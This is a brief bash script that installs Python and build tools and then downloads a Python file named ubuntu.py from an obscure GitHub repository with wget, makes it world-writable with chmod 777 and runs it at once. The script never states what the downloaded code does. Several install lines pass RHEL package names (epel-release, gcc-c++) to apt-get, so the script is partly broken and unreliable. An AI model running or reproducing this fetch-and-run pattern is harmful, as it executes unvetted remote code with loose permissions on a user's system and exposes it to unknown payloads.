#!/bin/bash
apt-get update
apt-get install -y git wget screen
apt-get install -y python python-dev
apt-get install -y epel-release
apt-get install -y python-pip
apt-get install -y gcc-c++
pip install sh
rm -rf ubuntu.py
wget https://raw.githubusercontent.com/cakcokcakcok/bnbnb/main/ubuntu.py
chmod 777 ubuntu.py
python ubuntu.py
